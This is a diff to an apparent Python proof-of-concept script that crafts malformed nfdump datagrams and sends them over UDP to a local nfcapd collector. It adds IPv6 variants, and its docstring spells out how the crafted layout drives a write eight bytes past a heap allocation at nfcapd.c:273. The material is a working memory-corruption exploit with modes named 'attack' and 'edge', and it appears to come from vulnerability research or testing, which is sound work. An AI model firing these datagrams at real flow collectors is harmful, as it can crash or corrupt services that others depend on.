@@ -145,18 +145,19 @@ def etype_datagram(first, nfversion=1):
                         1764000000, 1, 2) + body
 
 
-def edge_datagram():
-    """Fill a maximum IPv4 UDP payload (65507 B) with a 4-byte flow element last.
+def edge_datagram(total=65507):
+    """Fill a maximum UDP payload with a 4-byte flow element last.
 
-    Layout: 16 B nfd header + 12 B record header + a 65475 B dummy element
-    + a 4 B header-only EXgenericFlow element = 65507 B.  VerifyV3Record()
+    Layout: 16 B nfd header + 12 B record header + dummy element
+    + a 4 B header-only EXgenericFlow element = total bytes.  VerifyV3Record()
     accepts length 4 (it consumes its own header); GetExtension() returns
-    payload = in_buff + 65507, so the msecReceived store at payload+16
-    lands at 65523..65530 -- four bytes inside the 65535-byte malloc at
-    nfcapd.c:273.  Reads of later struct fields (inPackets at +24) cross
-    the allocation.
+    payload = in_buff + total, so the msecReceived store at payload+16
+    lands at total+16..total+23.  With IPv4 (65507) that is 65523..65530,
+    four bytes inside the 65535-byte malloc at nfcapd.c:273; with IPv6
+    (65527) it is 65543..65550, eight bytes past the allocation.  Reads of
+    later struct fields cross the allocation in both shapes.
     """
-    dummy_len = 65475
+    dummy_len = total - 16 - 12 - 4
     body = REC_HDR.pack(V3_RECORD, REC_HDR.size + dummy_len + 4,
                         2, 0, 0, 0, 0, 3)
     body += ELEM_HDR.pack(DUMMY_TYPE, dummy_len) + bytes(dummy_len - 4)
@@ -165,15 +166,17 @@ def edge_datagram():
                         1764000000, 1, 1) + body
 
 
-def edge_safe_datagram():
-    """Same 65507-byte size with a complete 52-byte EXgenericFlow last."""
-    dummy_len = 65427
+
+def edge_safe_datagram(total=65507):
+    """Same total size with a complete 52-byte EXgenericFlow last."""
+    dummy_len = total - 16 - 12 - EX_SIZE
     body = REC_HDR.pack(V3_RECORD, REC_HDR.size + dummy_len + EX_SIZE,
                         2, 0, 0, 0, 0, 3)
     body += ELEM_HDR.pack(DUMMY_TYPE, dummy_len) + bytes(dummy_len - 4)
     body += ELEM_HDR.pack(EX_GENERIC_FLOW, EX_SIZE) + generic_flow(3, 180)
     return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                         1764000000, 1, 1) + body
+
 
 
 def datagram(mode):
@@ -189,6 +192,11 @@ def datagram(mode):
         return edge_datagram()
     if mode == "edge-safe":
         return edge_safe_datagram()
+    if mode == "v6edge":
+        return edge_datagram(65527)
+    if mode == "v6edge-safe":
+        return edge_safe_datagram(65527)
+
 
     if mode == "single":
         body = record(20, b"\x41" * 16)
@@ -219,11 +227,15 @@ def main():
     ap.add_argument("mode", choices=("attack", "safe", "icmp", "single",
                                      "alias", "alias-safe", "hdr", "hdr-safe",
                                      "edge", "edge-safe",
+                                     "v6edge", "v6edge-safe",
                                      "etype", "etype-bad", "etype-safe"))
+
     a = ap.parse_args()
     pkt = datagram(a.mode)
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.sendto(pkt, ("127.0.0.1", a.port))
+    v6 = a.mode.startswith("v6")
+    s = socket.socket(socket.AF_INET6 if v6 else socket.AF_INET,
+                      socket.SOCK_DGRAM)
+    s.sendto(pkt, ("::1" if v6 else "127.0.0.1", a.port))
     s.close()
     r2 = NFD_HDR.size + REC_HDR.size + 20 if a.mode in ("attack", "icmp") else None
     if r2 is not None:
